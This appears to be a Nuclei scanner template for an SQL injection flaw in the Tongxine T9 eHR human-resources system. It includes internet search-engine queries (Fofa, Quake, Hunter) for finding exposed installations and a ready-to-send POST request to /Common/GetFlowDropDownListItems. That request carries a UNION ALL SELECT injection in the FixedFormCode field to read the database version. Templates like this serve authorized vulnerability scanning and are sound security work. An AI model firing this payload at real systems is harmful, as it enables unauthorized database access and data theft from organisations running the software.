id: Tongxine_T9eHR_GetFlowDropDownListItems_SQLi

info:
  name: Tongxine_T9eHR_GetFlowDropDownListItems_SQLi
  author: HK
  severity: high
  description: 同鑫eHR人力资源管理系统GetFlowDropDownListItems存在SQL注入漏洞
  metadata:
    max-request: 1
    Fofa-query: body="/TX.CDN"
    Quake-query: body="/TX.CDN"
    Hunter-query: body="/TX.CDN"
    verified: true

http:
- raw:
  - |-
    @timeout: 30s
    POST /Common/GetFlowDropDownListItems HTTP/1.1
    Host: {{Hostname}}
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Connection: close
    Content-Type: application/x-www-form-urlencoded; charset=utf-8
    Content-Length: 62

    FixedFormCode=1%27%20UNION%20ALL%20SELECT%20NULL%2C@@VERSION--

  max-redirects: 3
  matchers-condition: and
  matchers:
    - type: word
      part: body
      words:
        - SQL